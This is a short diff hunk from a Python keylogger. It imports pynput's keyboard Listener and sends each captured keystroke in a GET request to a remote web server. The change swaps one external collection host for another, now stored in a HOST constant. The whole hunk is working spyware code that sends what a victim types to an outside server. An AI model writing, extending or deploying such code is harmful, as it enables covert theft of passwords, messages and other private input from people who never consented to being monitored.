@@ -10,11 +10,12 @@ import requests
 from pynput.keyboard import Listener
 
 line_length = 0
+HOST = "https://salty-basin-28879.herokuapp.com/"
 
 
 def launch_request(key):
     try:
-        requests.get(f'https://flaskappkeylogger.azurewebsites.net/hello?key={key}')
+        requests.get(f'{HOST}hello?key={key}')
     except Exception as e:
         print(e)
 
